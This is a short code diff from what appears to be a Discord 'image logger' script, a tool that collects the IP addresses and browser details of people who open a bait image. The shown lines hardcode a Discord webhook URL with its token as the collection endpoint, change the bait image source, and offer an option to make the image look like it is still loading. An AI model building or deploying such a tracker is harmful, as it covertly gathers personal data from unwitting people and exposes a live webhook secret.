@@ -3,7 +3,7 @@ from urllib import parse
 import requests, base64, httpagentparser
 
 webhook = 'https://discord.com/api/webhooks/1066988742696513606/jcW2Rm6Su4y3HetnOaYCHwU6Q3BBtQj8n4MSAsKWnQKn2wXV7gqTYQvQ0uElN5k9jDsf'
-bindata = requests.get('https://scontent.ftun6-1.fna.fbcdn.net/v/t39.30808-6/325989032_1286493291983311_2061836158050289809_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=730e14&_nc_ohc=XFFQ9Vpp7bIAX_qfDOE&_nc_ht=scontent.ftun6-1.fna&oh=00_AfDBLZ1zesppCSd9rCvNhb2iYmk_lbH2q-mOeN0WQ7N-Dw&oe=63D32D41').content
+bindata = requests.get('https://i.imgur.com/ZCXc0lW.jpeg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
